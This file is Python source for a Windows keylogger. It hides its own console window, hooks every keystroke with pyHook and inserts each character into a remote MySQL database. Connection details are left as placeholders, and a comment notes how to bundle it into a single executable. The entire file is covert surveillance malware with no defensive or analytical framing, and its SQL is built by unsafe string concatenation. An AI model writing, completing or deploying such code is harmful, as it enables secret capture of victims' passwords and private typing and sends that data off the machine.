#pyinstaller --onefile script.py
import pyHook, pythoncom, sys, mysql.connector
import win32api
import win32console
import win32gui

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

conn = mysql.connector.connect(user='#', password='#', host='#', database='#')
cr = conn.cursor()
def OnKeyboardEvent (event) :
	chr(event.Ascii)
	print(chr(event.Ascii))
	query = "INSERT INTO logs VALUES(NULL, '"+chr(event.Ascii)+"')"
	cr.execute(query)
	conn.commit()
	return True

hooks_manager = pyHook.HookManager ()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard ()
pythoncom.PumpMessages()